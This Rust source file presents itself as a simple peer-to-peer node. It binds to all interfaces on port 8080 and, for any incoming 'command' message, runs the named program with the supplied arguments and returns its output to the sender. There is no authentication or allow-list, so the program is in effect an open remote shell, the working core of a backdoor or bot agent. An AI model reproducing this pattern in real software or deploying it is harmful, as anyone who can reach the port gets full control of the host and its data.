use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use serde::{Serialize, Deserialize};
use std::process::Command;
use std::env;
use std::error::Error;

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Message {
    msg_type: String,
    data: String,
    args: Vec<String>,
}

const HELP: &str = "h";
const VERBOSE: &str = "v";
static mut VERBOSE_MODE: bool = false;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    if args.contains(&HELP.to_string()) {
        print_help();
        return Ok(());
    }

    unsafe { VERBOSE_MODE = args.contains(&VERBOSE.to_string()) };

    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    println!("P2P node started on port 8080");

    // Connect to other peers (example: 127.0.0.1:8081)
    tokio::spawn(async move {
        connect_to_peers().await;
    });

    loop {
        let (socket, _) = listener.accept().await?;
        tokio::spawn(async move {
            handle_peer(socket).await;
        });
    }
}

async fn connect_to_peers() {

    let peers = vec!["127.0.0.1:8081", "127.0.0.1:8082"];
    for peer in peers {
        match TcpStream::connect(peer).await {
            Ok(mut stream) => {
                println!("Connected to peer: {}", peer);
                let msg = Message {
                    msg_type: "connect".to_string(),
                    data: "Hello peer!".to_string(),
                    args: vec![],
                };
                let data = serde_json::to_vec(&msg).unwrap();
                stream.write_all(&data).await.unwrap();
            }
            Err(e) => println!("Failed to connect to {}: {}", peer, e),
        }
    }
}

async fn handle_peer(mut socket: TcpStream) {
    let mut buffer = [0; 1024];
    match socket.read(&mut buffer).await {
        Ok(n) if n > 0 => {
            match serde_json::from_slice::<Message>(&buffer[..n]) {
                Ok(msg) => {
                    if unsafe { VERBOSE_MODE } {
                        println!("Received: {:?}", msg);
                    }
                    process_message(msg, &mut socket).await;
                }
                Err(e) => println!("Deserialization error: {}", e),
            }
        }
        Ok(_) => (),
        Err(e) => println!("Read error: {}", e),
    }
}

async fn process_message(msg: Message, socket: &mut TcpStream) {
    match msg.msg_type.as_str() {
        "command" => {
            let output = Command::new(&msg.data)
                .args(&msg.args)
                .output()
                .expect("Failed to execute command");

            let response = if output.status.success() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                String::from_utf8_lossy(&output.stderr).to_string()
            };

            let response_msg = Message {
                msg_type: "response".to_string(),
                data: response,
                args: vec![],
            };

            if let Ok(data) = serde_json::to_vec(&response_msg) {
                if let Err(e) = socket.write_all(&data).await {
                    println!("Failed to send response: {}", e);
                }
            }
        }
        "message" => {
            println!("Received message: {}", msg.data);
        }
        "connect" => {
            println!("New peer connected: {}", msg.data);
        }
        _ => println!("Unknown message type: {}", msg.msg_type),
    }
}

fn print_help() {
    println!("P2P Node Help");
    println!("Usage: cargo run [options]");
    println!("Options:");
    println!("  h    Show this help message");
    println!("  v    Enable verbose mode");
}
